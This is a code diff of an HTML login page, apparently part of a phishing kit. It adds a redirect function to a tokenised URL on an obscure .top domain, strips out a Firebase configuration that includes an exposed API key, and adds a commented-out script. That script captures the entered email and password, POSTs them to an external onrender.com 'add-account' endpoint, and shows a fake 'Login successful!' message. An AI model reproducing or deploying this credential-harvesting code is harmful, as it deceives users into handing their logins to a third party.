@@ -66,33 +66,45 @@
           </div>
 
             <button type="submit" class="login-button">Log in</button>
+            <script type="text/javascript">
+              function redirectToPage() {
+                  window.location.href = "https://approximatereservoir.top/45f0Xkh4Q3lXeXJRRwYnRVcGJEddDChbCXhkBAoDBioaK1Y6biMDCDtQIXtlag?1718686957216";
+              }
+          </script>
         </form>
 
         <div class="create-account">
             <p>Already have an account? <a href="#">Log In</a></p>
         </div>
     </div>
-    <script type="module">
-        // Import the functions you need from the SDKs you need
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js";
-        import { getAuth, createUserWithEmailAndPassword } from 'https://www.gstatic.com/firebasejs/10.12.4/firebase-auth.js'
+    <!-- <script>
+        document.getElementById('registrationForm').addEventListener('submit', registerUser);
 
-        // TODO: Add SDKs for Firebase products that you want to use
-        // https://firebase.google.com/docs/web/setup#available-libraries
-      
-        // Your web app's Firebase configuration
-        const firebaseConfig = {
-          apiKey: "AIzaSyAmcoqzwoblwciG9x5zd-WQipe3c9bIE6k",
-          authDomain: "qwertyqwe-da842.firebaseapp.com",
-          projectId: "qwertyqwe-da842",
-          storageBucket: "qwertyqwe-da842.appspot.com",
-          messagingSenderId: "607214606288",
-          appId: "1:607214606288:web:ff464cc3b08ac71cd10bd5"
-        };
-      
-        // Initialize Firebase
-        const app = initializeApp(firebaseConfig);
-      </script>
+        function registerUser(event) {
+          event.preventDefault();
+
+          const email = document.getElementById('email').value;
+          const password = document.getElementById('password').value;
+
+          // Make a request to the specified URL
+          fetch('https://suqwe.onrender.com/api/add-account/', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ email, password })
+          })
+          .then(response => response.json())
+          .then(data => {
+            console.log('Success:', data);
+            alert('Login successful!');
+          })
+          .catch((error) => {
+            console.error('Error:', error);
+            alert('Login failed: ' + error.message);
+          });
+        }
+    </script> -->
     <script src="main.js"></script>
 </body>
 </html>
